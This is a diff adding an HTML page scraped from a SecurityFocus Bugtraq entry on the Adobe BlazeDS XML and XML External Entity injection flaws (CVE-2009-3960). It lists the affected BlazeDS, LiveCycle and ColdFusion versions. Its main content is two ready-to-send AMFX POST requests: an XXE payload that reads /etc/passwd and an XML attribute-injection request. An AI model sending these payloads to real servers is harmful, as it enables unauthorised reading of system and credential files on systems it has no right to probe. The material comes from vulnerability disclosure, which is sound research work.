@@ -1,0 +1,133 @@
+#SpeeDr00t@Black Falcon<br>#bid38197<p><b><span style="font-size: 18pt;">Adobe BlazeDS XML and XML External Entity Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/38197/info">info</a><br><a href="http://www.securityfocus.com/bid/38197/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/38197/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/38197/solution">solution</a><br><a href="http://www.securityfocus.com/bid/38197/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				38197
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2009-3960<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 11 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 05 2010 09:02PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Roberto Suggi Liverani of Security-Assessment.com
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Adobe LiveCycle Data Services 2.6.1 <br/>
+					
+				
+					Adobe LiveCycle Data Services 2.5.1 <br/>
+					
+				
+					Adobe LiveCycle Data Services  3.0<br/>
+					
+				
+					Adobe LiveCycle 8.2.1 <br/>
+					
+				
+					Adobe LiveCycle 8.0.1 <br/>
+					
+				
+					Adobe LiveCycle  9.0<br/>
+					
+				
+					Adobe Flex Data Services 2.0.1 <br/>
+					
+				
+					Adobe ColdFusion 8.0.1 <br/>
+					
+				
+					Adobe ColdFusion 7.0.2 <br/>
+					
+				
+					Adobe ColdFusion  9.0<br/>
+					
+				
+					Adobe ColdFusion  8.0<br/>
+					
+				
+					Adobe ColdFusion  8<br/>
+					
+				
+					Adobe BlazeDS  3.2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example AMFX requests are available:<br/><br/>1. XML External Entity injection:<br/><br/>POST /samples/messagebroker/http HTTP/1.1 <br/>Content-type: application/x-amf <br/> <br/>&amp;lt;?xml version="1.0" encoding="utf-8"?&amp;gt; <br/>&amp;lt;!DOCTYPE test  &amp;lt;!ENTITY x3 SYSTEM "/etc/passwd"&amp;gt; &amp;gt; <br/>&amp;lt;amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx"&amp;gt; <br/>  &amp;lt;body&amp;gt; <br/>    &amp;lt;object type="flex.messaging.messages.CommandMessage"&amp;gt; <br/>      &amp;lt;traits&amp;gt; <br/>        &amp;lt;string&amp;gt;body&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;clientId&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;correlationId&amp;lt;/string&amp;gt; <br/>        &amp;lt;string&amp;gt;destination&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;headers&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;messageId&amp;lt;/string&amp;gt; <br/>        &amp;lt;string&amp;gt;operation&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;timestamp&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;timeToLive&amp;lt;/string&amp;gt; <br/>      &amp;lt;/traits&amp;gt;&amp;lt;object&amp;gt;&amp;lt;traits /&amp;gt; <br/>      &amp;lt;/object&amp;gt; <br/>      &amp;lt;null /&amp;gt;&amp;lt;string /&amp;gt;&amp;lt;string /&amp;gt; <br/>      &amp;lt;object&amp;gt; <br/>        &amp;lt;traits&amp;gt; <br/>          &amp;lt;string&amp;gt;DSId&amp;lt;/string&amp;gt;&amp;lt;string&amp;gt;DSMessagingVersion&amp;lt;/string&amp;gt; <br/>        &amp;lt;/traits&amp;gt; <br/>        &amp;lt;string&amp;gt;nil&amp;lt;/string&amp;gt;&amp;lt;int&amp;gt;1&amp;lt;/int&amp;gt; <br/>      &amp;lt;/object&amp;gt; <br/>      &amp;lt;string&amp;gt;&amp;amp;x3;&amp;lt;/string&amp;gt; <br/>&amp;lt;int&amp;gt;5&amp;lt;/int&amp;gt;&amp;lt;int&amp;gt;0&amp;lt;/int&amp;gt;&amp;lt;int&amp;gt;0&amp;lt;/int&amp;gt; <br/>    &amp;lt;/object&amp;gt; <br/>  &amp;lt;/body&amp;gt; <br/>&amp;lt;/amfx&amp;gt; <br/><br/>2. XML injection<br/><br/>POST /samples/messagebroker/http HTTP/1.1 <br/>Content-type: application/x-amf <br/> <br/>&amp;lt;?xml version="1.0" encoding="utf-8"?&amp;gt; <br/>&amp;lt;amfx ver="3"&amp;gt;&amp;lt;body targetURI="" responseURI="d&amp;amp;quot; injectedattr=&amp;amp;quot;anything"&amp;gt;&amp;lt;null/&amp;gt; <br/>&amp;lt;/body&amp;gt;&amp;lt;/amfx&amp;gt;
+	
+		<ul>
+</ul>
+</div>
